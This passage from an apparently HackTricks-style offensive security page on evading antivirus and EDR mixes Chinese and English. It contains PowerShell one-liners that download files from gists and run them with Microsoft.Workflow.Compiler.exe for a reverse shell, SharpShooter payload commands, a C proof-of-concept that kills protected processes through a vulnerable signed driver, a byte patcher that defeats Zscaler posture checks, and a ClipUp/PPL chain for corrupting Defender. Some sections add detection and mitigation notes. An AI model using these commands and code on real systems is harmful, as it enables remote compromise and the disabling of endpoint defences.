powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器 示例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放勒索软件前禁用终端防护。该工具携带它的 **own vulnerable but *signed* driver** 并滥用它来发起特权内核操作，甚至受 Protected-Process-Light (PPL) 保护的 AV 服务也无法阻止这些操作。

关键要点
1. **Signed driver**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是来自 Antiy Labs “System In-Depth Analysis Toolkit” 的合法签名驱动 `AToolsKrnl64.sys`。由于该驱动具有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. 服务安装：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **kernel service**，第二行启动它，使得 `\\.\ServiceMouse` 可以从 user land 访问。
3. 驱动暴露的 IOCTLs
| IOCTL code | 功能 |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上任意文件 |
| `0x990001D0` | 卸载驱动并删除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. 为什么可行：BYOVD 完全绕过用户态保护；在内核执行的代码可以打开 *protected* 进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他加固特性的限制。

检测 / 缓解
• 启用 Microsoft 的 vulnerable-driver 阻止列表（`HVCI`, `Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。  
• 监控新 *kernel* 服务的创建，并在驱动从可被全体写入的目录加载或不在允许列表时发出告警。  
• 关注对自定义设备对象的 user-mode handle 被创建，随后出现可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地应用 device-posture 规则，并依赖 Windows RPC 将结果传递给其他组件。两个弱设计使得完全绕过成为可能：

1. Posture evaluation 完全在客户端进行（向服务器发送的是一个布尔值）。  
2. 内部 RPC 端点只验证连接的可执行文件是否由 Zscaler 签名（通过 `WinVerifyTrust`）。

通过对磁盘上的四个已签名二进制进行 patch，两个机制都可以被中和：

| Binary | 被修改的原始逻辑 | 结果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查均视为合规 |
| `ZSAService.exe` | 间接调用 `WinVerifyTrust` | 被 NOP 处理 ⇒ 任何（即使未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对 tunnel 的完整性检查 | 被绕过 |

最小 patcher 片段：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **All** posture checks display **green/compliant**.
* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.

This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.

## 滥用 Protected Process Light (PPL) 通过 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制实施签名者/级别层级，只有相同或更高级别的受保护进程才能相互篡改。从攻击角度看，如果你能够合法启动一个启用 PPL 的二进制并控制其参数，就可以将良性功能（例如日志记录）转化为针对 AV/EDR 使用的受保护目录的受限、由 PPL 支持的写入原语。

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN 原语：ClipUp.exe
- 已签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我生成并接受一个参数，用于将日志文件写入调用方指定的路径。
- 当以 PPL 进程启动时，文件写入将具有 PPL 支持。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径来指向通常受保护的位置。

8.3 短路径辅助工具
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

滥用链（概要）
1) 使用一个启动器（例如 CreateProcessAsPPL），以 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数以强制在受保护的 AV 目录（例如 Defender Platform）中创建文件。必要时使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），通过安装一个能更早可靠运行的自启动服务，将写入安排在 AV 启动之前的引导阶段。使用 Process Monitor（引导日志）验证启动顺序。
4) 重启后，带有 PPL 支持的写入会在 AV 锁定其二进制文件之前发生，从而破坏目标文件并阻止其启动。

示例调用（出于安全起见对路径进行了涂抹/缩短）：
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
注意事项与限制
- 你无法控制 ClipUp 写入内容的具体内容，除了放置位置；该 primitive 更适合破坏而非精确内容注入。
- 需要本地 admin/SYSTEM 权限来安装/启动服务并且需要重启窗口。
- 时间非常关键：目标必须处于未打开状态；引导时执行可避免文件锁定。

检测
- 在引导期间，注意使用异常参数创建 `ClipUp.exe` 的进程，尤其是由非标准启动器作为父进程创建的情况。
- 发现配置为自启动可疑二进制并且持续在 Defender/AV 之前启动的新服务。调查 Defender 启动失败前的服务创建/修改情况。
- 对 Defender 二进制/Platform 目录的文件完整性监控；留意带有 protected-process 标志的进程进行的意外文件创建/修改。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制异常使用 PPL 级别的情况。

缓解措施
- WDAC/Code Integrity：限制哪些签名二进制可作为 PPL 运行以及允许哪些父进程；阻止在非合法上下文中调用 ClipUp。
- 服务管理：限制自启动服务的创建/修改并监控启动顺序的操控。
- 确保启用 Defender 的防篡改和早期加载保护；调查指示二进制被破坏的启动错误。
- 如果与环境兼容（需充分测试），考虑在承载安全工具的卷上禁用 8.3 短名生成。

PPL 和工具参考
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
